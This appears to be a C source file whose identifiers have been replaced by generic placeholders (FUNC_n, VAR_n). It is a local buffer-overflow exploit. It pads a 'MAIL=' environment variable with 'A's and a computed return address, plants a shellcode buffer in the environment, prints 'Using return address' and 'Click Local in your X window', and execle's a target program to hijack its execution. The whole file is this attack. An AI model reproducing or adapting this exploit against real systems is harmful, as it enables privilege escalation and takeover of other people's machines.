
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


typedef int uid_t ;
typedef int eggbuf ;
typedef int display ;
typedef int buf ;
struct TYPE_3__ {int pw_dir; } ;


 int VAR_0 ;
 unsigned int VAR_1 ;
 int VAR_2 ;
 char* VAR_3 ;
 int FUNC_0 (char*,int) ;
 int FUNC_1 (char*,char**,char**) ;
 long FUNC_2 (long,char**,char**,int) ;
 int FUNC_3 () ;
 char* FUNC_4 (char*,int) ;
 char* FUNC_5 (char*) ;
 TYPE_1__* FUNC_6 (int ) ;
 scalar_t__ FUNC_7 () ;
 int FUNC_8 (char*,char*,int) ;
 int FUNC_9 (char*,char,long) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*,...) ;
 TYPE_1__* VAR_4 ;
 char* VAR_5 ;
 int FUNC_12 (char*,int,char*,char*) ;
 char* FUNC_13 (int ) ;
 int FUNC_14 (char*) ;
 int FUNC_15 (char*,int ,int) ;

int
FUNC_16(int VAR_6, char **VAR_7)
{
        char VAR_8[4096], VAR_9[128], VAR_10[256];
        char VAR_11[2048];
        long VAR_12, VAR_13 = VAR_2;
        char *VAR_14[24], *VAR_15[24], *VAR_16, *VAR_17;
        char VAR_18[64], VAR_19[64];
        unsigned int *VAR_20;
        char *VAR_21;
        char VAR_22[] = "MAIL=";
        long VAR_23, VAR_24, VAR_25;
        long VAR_26 = 2048;

        if (VAR_6 > 1)
                FUNC_12(VAR_10, sizeof(VAR_10) - 1, "DISPLAY=%s", VAR_7[1]);
        else {
                VAR_21 = FUNC_5("DISPLAY");
                if (VAR_21)
                        FUNC_12(VAR_10, sizeof(VAR_10) - 1, "DISPLAY=%s", VAR_21);
                else
                        FUNC_15(VAR_10, VAR_0, sizeof(VAR_10) - 1);
        }

        VAR_4 = FUNC_6((uid_t) FUNC_7());
        FUNC_12(VAR_9, 127, "HOME=%s", FUNC_13(VAR_4->pw_dir));

        VAR_14[0] = VAR_3;
        VAR_14[1] = ((void*)0);

        VAR_16 = FUNC_4((char *) ((void*)0), 256);
        VAR_26 = VAR_26 - (FUNC_14(VAR_16) + FUNC_14("/"));
        VAR_23 = FUNC_14(VAR_22);
        FUNC_0(VAR_8, sizeof(VAR_8));
        FUNC_8(VAR_8, VAR_22, VAR_23);
        FUNC_9(VAR_8 + VAR_23, 'A', VAR_26);

        FUNC_0(VAR_11, sizeof(VAR_11));
        VAR_20 = (unsigned int *) VAR_11;
        for (VAR_24 = 0; VAR_24 < sizeof(VAR_11) - FUNC_14(VAR_5); VAR_24 += 4)
                *(VAR_20 + VAR_24 / 4) = VAR_1;
        FUNC_8(VAR_11 + VAR_24 - 4, VAR_5, FUNC_14(VAR_5));

        VAR_15[0] = VAR_18;
        VAR_15[1] = VAR_11;
        VAR_15[2] = VAR_19;
        VAR_15[3] = VAR_8;
        VAR_15[4] = VAR_10;
        VAR_15[5] = VAR_9;
        VAR_15[6] = ((void*)0);


        if (((unsigned char) (FUNC_3() >> 24)) == 0xef) {
                VAR_13 = VAR_2 - 0x0fbf0000;
        }
        VAR_12 = FUNC_2(VAR_13, VAR_14, VAR_15, -8);

        VAR_12 -= 8;
        FUNC_11("Using  return address = 0x%x (shelladdrr - 8)\n", VAR_12);
        FUNC_11("Click Local in your X window\n\n");

        VAR_17 = (char *) &VAR_12;
        VAR_25 = 4 - ((FUNC_14(VAR_16) + FUNC_14("/")) % 4);
        for (VAR_24 = 0; VAR_24 < VAR_26 - VAR_25; VAR_24++)
                VAR_8[VAR_23 + VAR_25 + VAR_24] = *(VAR_17 + VAR_24 % 4);


        FUNC_1(VAR_3, VAR_14, VAR_15);
        FUNC_10("execle");
}
